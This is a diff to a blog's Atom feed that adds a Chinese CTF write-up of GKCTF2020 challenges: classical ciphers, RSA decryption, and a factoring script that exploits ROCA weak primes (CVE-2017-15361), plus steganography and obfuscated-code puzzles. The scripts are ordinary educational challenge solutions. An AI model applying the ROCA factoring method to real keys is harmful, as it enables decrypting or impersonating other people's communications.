@@ -8,13 +8,644 @@
     <author>
       <name>Clown</name>
     </author>
-    <updated>2023-04-01T04:00:00.000Z</updated>
+    <updated>2023-04-04T16:00:00.000Z</updated>
     <category term="Clown" />
     <category term="Web" />
     <category term="Pwn" />
     <category term="CTF" />
     <category term="AWD" />
     <category term="ACM" />
+    <entry>
+        <id>https://blog.xcu.icu/2023/04/05/GKCTF2020/</id>
+        <title>GKCTF2020WP</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/04/05/GKCTF2020/"/>
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;通过buuctf平台复现一些之前的赛题&lt;/p&gt;
+&lt;h2 id=&#34;Crypto&#34;&gt;&lt;a href=&#34;#Crypto&#34; class=&#34;headerlink&#34; title=&#34;Crypto&#34;&gt;&lt;/a&gt;Crypto&lt;/h2&gt;&lt;h3 id=&#34;小学生的密码题&#34;&gt;&lt;a href=&#34;#小学生的密码题&#34; class=&#34;headerlink&#34; title=&#34;小学生的密码题&#34;&gt;&lt;/a&gt;小学生的密码题&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304031046078.png&#34; alt=&#34;image-20230403104605972&#34;&gt;&lt;/p&gt;
+&lt;p&gt;题目描述就这么多，简单的仿射加密&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;c=Ea,b(m)=am+b (mod 26)
+m=Da,b(c)=a−1(c−b) (mod 26)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;根据题目描述，可得a&amp;#x3D;11，b&amp;#x3D;6 &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import base64
+from gmpy2 import invert
+
+m = &amp;#39;welcylk&amp;#39;
+a=11
+b=6
+c=&amp;#39;&amp;#39;
+k=26
+
+
+for i in range(len(m)):
+    c +=chr((((invert(a,k))*((ord(m[i])-97)-b))%26)+97)
+
+print(c)
+//sorcery
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;汉字的秘密&#34;&gt;&lt;a href=&#34;#汉字的秘密&#34; class=&#34;headerlink&#34; title=&#34;汉字的秘密&#34;&gt;&lt;/a&gt;汉字的秘密&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当铺加密，很奇怪，当前汉字有多少笔画出头，就是转化成数字几，一一对应的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;hz = &amp;quot;田口由中人工大土士王夫井羊壮&amp;quot;
+sz = &amp;quot;00123455567899&amp;quot;
+
+m = &amp;quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&amp;quot;
+s = &amp;quot;&amp;quot;
+
+for i in m:
+    if i in hz:
+        s += sz[hz.index(i)]
+    else:
+        s += &amp;#39; &amp;#39;
+# print(s)
+
+ll = s.split(&amp;quot; &amp;quot;)
+print(ll)
+s = &amp;#39;&amp;#39;
+for i in range(len(ll)):
+    s += chr(int(ll[i]))
+print(s)
+#[&amp;#39;69&amp;#39;, &amp;#39;74&amp;#39;, &amp;#39;62&amp;#39;, &amp;#39;67&amp;#39;, &amp;#39;118&amp;#39;, &amp;#39;83&amp;#39;, &amp;#39;72&amp;#39;, &amp;#39;77&amp;#39;, &amp;#39;86&amp;#39;, &amp;#39;55&amp;#39;, &amp;#39;71&amp;#39;, &amp;#39;57&amp;#39;, &amp;#39;82&amp;#39;, &amp;#39;57&amp;#39;, &amp;#39;64&amp;#39;, &amp;#39;63&amp;#39;, &amp;#39;51&amp;#39;, &amp;#39;107&amp;#39;]
+#EJ&amp;gt;CvSHMV7G9R9@?3k
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里转化后，发现转为字符后不规律，这里即将前几个字符对应flag转换，是一个变异凯撒&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;hz = &amp;quot;田口由中人工大土士王夫井羊壮&amp;quot;
+sz = &amp;quot;00123455567899&amp;quot;
+
+m = &amp;quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&amp;quot;
+s = &amp;quot;&amp;quot;
+
+for i in m:
+    if i in hz:
+        s += sz[hz.index(i)]
+    else:
+        s += &amp;#39; &amp;#39;
+# print(s)
+
+ll = s.split(&amp;quot; &amp;quot;)
+print(ll)
+s = &amp;#39;&amp;#39;
+for i in range(len(ll)):
+    s += chr(int(ll[i])+i+1)
+print(s.lower())
+#[&amp;#39;69&amp;#39;, &amp;#39;74&amp;#39;, &amp;#39;62&amp;#39;, &amp;#39;67&amp;#39;, &amp;#39;118&amp;#39;, &amp;#39;83&amp;#39;, &amp;#39;72&amp;#39;, &amp;#39;77&amp;#39;, &amp;#39;86&amp;#39;, &amp;#39;55&amp;#39;, &amp;#39;71&amp;#39;, &amp;#39;57&amp;#39;, &amp;#39;82&amp;#39;, &amp;#39;57&amp;#39;, &amp;#39;64&amp;#39;, &amp;#39;63&amp;#39;, &amp;#39;51&amp;#39;, &amp;#39;107&amp;#39;]
+#flag&amp;#123;you_are_good&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;babycrypto&#34;&gt;&lt;a href=&#34;#babycrypto&#34; class=&#34;headerlink&#34; title=&#34;babycrypto&#34;&gt;&lt;/a&gt;babycrypto&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;# n:0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L
+# e:65537
+# enc:1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361
+# p&amp;gt;&amp;gt;128&amp;lt;&amp;lt;128:0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000L
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;拿到题后就是上面的内容，看起来是RSA，20年的题了现在可以直接分解出来这个n，直接常规接RSA即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from gmpy2 import *
+import libnum
+
+n = 22356763374676421464625378500213339933332772809897207920729779273423674391734609826525432054721219700275907299132471518921609327317193522567659631757746842030241874692914098354564311806192080734895649520789778880115460999713973202684541940857690744940359412410680906226760273075221532248260114209496048785258860756023841150910290983974843412361701517438220974722832625030127395031631696995777436058406987465592189873785392136925593708921923255186282515777996509326779993612528103615281644689464568237409082282767318227236298791238683706176542426759149262625349498709445342710799386836175120162674849965878446213480453
+e = 65537
+p = 139091353059018128421744751525080056530307965918298875691299992775484064426591581456998968315582349027071987206340653988925923465225471661893944397744293391269274124345189028818977002600599732469824164218366399726233373069742839737062004061244787413638290767590029376062508897417109117189614458570241407458359
+q = 160734387026849747944319274262095716650717626398118440194223452208652532694713113062084219512359968722796763029072117463281356654614167941930993838521563406258263299846297499190884495560744873319814150988520868951045961906000066805136724505347218275230562125457122462589771119429631727404626489634314291445667
+c = 1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361
+
+N = (p-1)*(q-1)
+d = invert(e,N)
+m = pow(c,d,n)
+print(libnum.n2s(int(m)))
+//b&amp;#39;flag&amp;#123;3d0914a1-1e97-4822-a745-c7e20c5179b9&amp;#125;&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;Backdoor&#34;&gt;&lt;a href=&#34;#Backdoor&#34; class=&#34;headerlink&#34; title=&#34;Backdoor&#34;&gt;&lt;/a&gt;Backdoor&lt;/h3&gt;&lt;p&gt;这个题下载后给了三个文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041526867.png&#34; alt=&#34;image-20230404152640752&#34;&gt;&lt;/p&gt;
+&lt;p&gt;题目名叫后门，给了一个公式&lt;strong&gt;弱素数生成公式&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041527502.png&#34; alt=&#34;image-20230404152753424&#34;&gt;&lt;/p&gt;
+&lt;p&gt;flag.enc&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;MDIxNDJhZjdjZTcwZmUwZGRhZTExNmJiN2U5NjI2MDI3NGVlOTI1MmE4Y2I1MjhlN2ZkZDI5ODA5YzJhNjAzMjcyN2MwNTUyNjEzM2FlNDYxMGVkOTQ0NTcyZmYxYWJmY2QwYjE3YWEyMmVmNDRhMg==
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个值解base64之后转10进制&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;59021026099361835300364130419492050160728561849475961557849334226894382166900594987062873888829896738392942368210302613981217873768
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;pub.pem&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;-----BEGIN PUBLIC KEY-----
+MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4BXdHlrMB4cf0C0lFBWiLH94h9tX/zmNv
+8WfYXjfXp7dJPjPBfUQXolyiSmcWMUzxhuFpltz8Z5sCAwEAAQ==
+-----END PUBLIC KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;task.py&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#!/usr/bin/python
+from Crypto.Util.number import *
+from Crypto.PublicKey import RSA
+import gmpy2, binascii
+import base64
+from FLAG import flag
+
+def rsa_encrypt(message):
+    with open(&amp;#39;./pub.pem&amp;#39; ,&amp;#39;r&amp;#39;) as f:
+        key = RSA.import_key(f.read())
+    e = key.e
+    n = key.n
+    c = pow(bytes_to_long(flag), e, n)
+ 
+    ciphertext = binascii.hexlify(long_to_bytes(c))
+    return ciphertext
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    text = base64.b64encode(rsa_encrypt(flag))
+    with open(&amp;#39;flag.enc&amp;#39;,&amp;#39;wb&amp;#39;) as f:
+        f.write(text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;google后发现是CVE-2017-15361，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL2FzZWN1cml0eXNpdGUtd2hlbi1ib2ItbWV0LWFsaWNlL3NvLXdoYXQtd2FzLXRoZS1wcm9ibGVtLXdpdGgtdGhlLWVzdG9uaWFuLWlkLXN5c3RlbS1hbmQtdHBtcy0xZWYwMmE5YmRlN2Y=&#34;&gt;那么爱沙尼亚身份证系统和TPM的问题是什么？弱素数生成器（和 RSA！ |作者：比尔·布坎南教授 OBE |A安全网站：当鲍勃遇见爱丽丝 |中等 (medium.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hc2VjdXJpdHlzaXRlLmNvbS9lbmNyeXB0aW9uL2NvcHBlcg==&#34;&gt;弱素数生成器 （RSALib） (asecuritysite.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;其中 &lt;em&gt;k&lt;/em&gt; 和 &lt;em&gt;a&lt;/em&gt; 是破解时的未知整数。&lt;em&gt;M&lt;/em&gt; 是前 n 个素数的乘法。&lt;/p&gt;
+&lt;p&gt;n的素数因子p是由这个公式得出的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from Crypto.Util import number
+
+k=3
+vals=39
+a=12
+M=1
+
+primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999]
+
+for x in range(0, vals):
+    M=M*primes[x]
+
+p=k*M+(65537**a %M)
+print(&amp;#39;k=&amp;#39;,k)
+print(&amp;#39;a=&amp;#39;,a)
+print(&amp;#39;Number of prime numbers used=&amp;#39;,vals)
+print(&amp;#39;======&amp;#39;)
+
+print(&amp;#39;M=&amp;#39;,M)
+print(&amp;#39;\nPrime=&amp;#39;,p)
+
+isp = number.isPrime(p)
+if (isp==1):
+    print(&amp;#39;Value is prime&amp;#39;)
+else:
+    print(&amp;#39;Value is not prime&amp;#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过pub.pwm来获取e和n&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;with open(&amp;#39;./pub.pem&amp;#39; ,&amp;#39;r&amp;#39;) as f:
+    key = RSA.import_key(f.read())
+    e = key.e
+    n = key.n
+#e=65535
+#n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里的n是134位，预估p的位数不超过134&amp;#x2F;2&amp;#x3D;67位，M 代表前 x 项素数的乘积， x 的可选值有5，16，39，71，80，126。在参数 k 与 a 取值不大的情况下，选取不同的 x 值，得到的 p 的位数不同。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041614575.png&#34; alt=&#34;image-20230404161441453&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里爆破一下求得pq&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import gmpy2
+M=962947420735983927056946215901134429196419130606213075415963491270
+n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739
+
+for k in range(100):
+    for a in range(100):
+        p=k*M+(65537**a %M)
+        if n%p==0:
+            print(&amp;#39;k=&amp;#39;,k)
+            print(&amp;#39;a=&amp;#39;,a)
+            print(&amp;#39;Prime=&amp;#39;,p)
+            isp = gmpy2.is_prime(p)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041616242.png&#34; alt=&#34;image-20230404161647184&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from gmpy2 import *
+import libnum
+
+n = 15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739
+e = 65537
+p = 3386619977051114637303328519173627165817832179845212640767197001941
+q = 4582433561127855310805294456657993281782662645116543024537051682479
+c = int(&amp;quot;02142af7ce70fe0ddae116bb7e96260274ee9252a8cb528e7fdd29809c2a6032727c05526133ae4610ed944572ff1abfcd0b17aa22ef44a2&amp;quot;,16)
+
+N = (p-1)*(q-1)
+d = invert(e,N)
+m = pow(c,d,n)
+# print(d)
+print(libnum.n2s(int(m)))
+#b&amp;#39;flag&amp;#123;760958c9-cca9-458b-9cbe-ea07aa1668e4&amp;#125;&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;Misc&#34;&gt;&lt;a href=&#34;#Misc&#34; class=&#34;headerlink&#34; title=&#34;Misc&#34;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&#34;Pokémon&#34;&gt;&lt;a href=&#34;#Pokémon&#34; class=&#34;headerlink&#34; title=&#34;Pokémon&#34;&gt;&lt;/a&gt;Pokémon&lt;/h3&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZW11bGF0b3Item9uZS5jb20vZG9jLnBocC9nYmEvdmJveWFkdmFuY2UuaHRtbA==&#34;&gt;Visual Boy Advance (emulator-zone.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;玩这个游戏，到103号路口就行，纯娱乐&lt;/p&gt;
+&lt;h3 id=&#34;code-obfuscation&#34;&gt;&lt;a href=&#34;#code-obfuscation&#34; class=&#34;headerlink&#34; title=&#34;code obfuscation&#34;&gt;&lt;/a&gt;code obfuscation&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041752507.png&#34; alt=&#34;image-20230404175252420&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将图片拉伸一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041753123.png&#34; alt=&#34;image-20230404175317080&#34;&gt;&lt;/p&gt;
+&lt;p&gt;补一下这个图&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041756324.png&#34; alt=&#34;image-20230404175641276&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041757333.png&#34; alt=&#34;image-20230404175700284&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里用binwalk -e 分解后得到一个rar&lt;/p&gt;
+&lt;p&gt;将上面gkctf进行base58编码后可以打开压缩包&lt;/p&gt;
+&lt;p&gt;打开后图片内容&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce
+$Ai$An$At$Bk$Am$Aa$Ai$Bs$Bt$Cn
+$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb
+$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb
+$Cp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;1文件内容&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;eval(function(p,a,c,k,e,d)&amp;#123;e=function(c)&amp;#123;return(c&amp;lt;a?&amp;quot;&amp;quot;:e(parseInt(c/a)))+((c=c%a)&amp;gt;35?String.fromCharCode(c+29):c.toString(36))&amp;#125;;if(!&amp;#39;&amp;#39;.replace(/^/,String))&amp;#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&amp;#123;return d[e]&amp;#125;];e=function()&amp;#123;return&amp;#39;\\w+&amp;#39;&amp;#125;;c=1;&amp;#125;;while(c--)if(k[c])p=p.replace(new RegExp(&amp;#39;\\b&amp;#39;+e(c)+&amp;#39;\\b&amp;#39;,&amp;#39;g&amp;#39;),k[c]);return p;&amp;#125;(&amp;#39;15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17=&amp;quot;n&amp;quot;12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17=&amp;quot;n&amp;quot;12 13=0 15 n 14 a b c d e f g h i j 10 11 16=&amp;quot;n&amp;quot;13=$((13+1))12 1g(&amp;quot;1f=\&amp;#39; \&amp;#39;;1e=\&amp;#39;&amp;quot;\&amp;#39;;16=\&amp;#39;#\&amp;#39;;1j=\&amp;#39;(\&amp;#39;;1i=\&amp;#39;)\&amp;#39;;1h=\&amp;#39;.\&amp;#39;;1a=\&amp;#39;;\&amp;#39;;19=\&amp;#39;&amp;lt;\&amp;#39;;18=\&amp;#39;&amp;gt;\&amp;#39;;1d=\&amp;#39;1c\&amp;#39;;1b=\&amp;#39;&amp;#123;\&amp;#39;;1k=\&amp;#39;&amp;#125;\&amp;#39;;1t=\&amp;#39;0\&amp;#39;;1u=\&amp;#39;1\&amp;#39;;1s=\&amp;#39;2\&amp;#39;;1r=\&amp;#39;3\&amp;#39;;1n=\&amp;#39;4\&amp;#39;;1m=\&amp;#39;5\&amp;#39;;1l=\&amp;#39;6\&amp;#39;;1q=\&amp;#39;7\&amp;#39;;1p=\&amp;#39;8\&amp;#39;;1o=\&amp;#39;9\&amp;#39;;&amp;quot;)&amp;#39;,62,93,&amp;#39;||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db&amp;#39;.split(&amp;#39;|&amp;#39;),0,&amp;#123;&amp;#125;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里用的是网上找到的脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import string
+s = &amp;quot;$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp&amp;quot;
+ll = s.split(&amp;#39;$&amp;#39;)
+list1 = [&amp;#39;Bk&amp;#39;,&amp;#39;Bm&amp;#39;,&amp;#39;Bn&amp;#39;,&amp;#39;Bs&amp;#39;,&amp;#39;Bt&amp;#39;,&amp;#39;By&amp;#39;,&amp;#39;Cb&amp;#39;,&amp;#39;Cc&amp;#39;,&amp;#39;Ce&amp;#39;,&amp;#39;Cl&amp;#39;,&amp;#39;Cn&amp;#39;,&amp;#39;Cp&amp;#39;,
+&amp;#39;Da&amp;#39;,&amp;#39;Db&amp;#39;,&amp;#39;Dc&amp;#39;,&amp;#39;Dd&amp;#39;,&amp;#39;De&amp;#39;,&amp;#39;Df&amp;#39;,&amp;#39;Dg&amp;#39;,&amp;#39;Dh&amp;#39;,&amp;#39;Di&amp;#39;,&amp;#39;Dj&amp;#39;]
+list2 = [&amp;#39; &amp;#39;,&amp;#39;&amp;quot;&amp;#39;,&amp;#39;#&amp;#39;,&amp;#39;(&amp;#39;,&amp;#39;)&amp;#39;,&amp;#39;.&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;&amp;lt;&amp;#39;,&amp;#39;&amp;gt;&amp;#39;,&amp;#39;_&amp;#39;,&amp;#39;&amp;#123;&amp;#39;,&amp;#39;&amp;#125;&amp;#39;,&amp;#39;0&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;3&amp;#39;,&amp;#39;4&amp;#39;,&amp;#39;5&amp;#39;,&amp;#39;6&amp;#39;,&amp;#39;7&amp;#39;,&amp;#39;8&amp;#39;,&amp;#39;9&amp;#39;]
+list3 = []
+list4 = []
+s = string.ascii_lowercase
+for i in s:
+    list3.append(&amp;#39;A%s&amp;#39;%i)
+    list4.append(i)
+#print(list3,&amp;#39;\n&amp;#39;,list4)
+
+t = &amp;#39;&amp;#39;
+for i in range(0,len(ll)):
+    for j in range(0,len(list1)):
+        if ll[i]==list1[j]:
+            t += list2[j]
+    for k in range(0,len(list3)):
+        if ll[i]==list3[k]:
+            t +=list4[k]
+print(t)
+#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;print(&amp;quot;w3lc0me_4o_9kct5&amp;quot;)return 0&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;Harley-Quinn&#34;&gt;&lt;a href=&#34;#Harley-Quinn&#34; class=&#34;headerlink&#34; title=&#34;Harley Quinn&#34;&gt;&lt;/a&gt;Harley Quinn&lt;/h3&gt;&lt;p&gt;这题放了两个hint，看起来当时开始的时候做出来的人还是不多的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357129.png&#34; alt=&#34;image-20230404235705038&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357970.png&#34; alt=&#34;image-20230404235716937&#34;&gt;&lt;/p&gt;
+&lt;p&gt;音频到结尾部分，有电话音的声音，用工具dtmf2num进行破解：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050010205.png&#34; alt=&#34;image-20230405001023160&#34;&gt;&lt;/p&gt;
+&lt;p&gt;#22283334447777338866#&lt;/p&gt;
+&lt;p&gt;对应9建&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;ctfisfun
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021579.png&#34; alt=&#34;image-20230405002121528&#34;&gt;&lt;/p&gt;
+&lt;p&gt;根据提示使用FreeFileCamouflage破解&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021405.png&#34; alt=&#34;image-20230405002156367&#34;&gt;&lt;/p&gt;
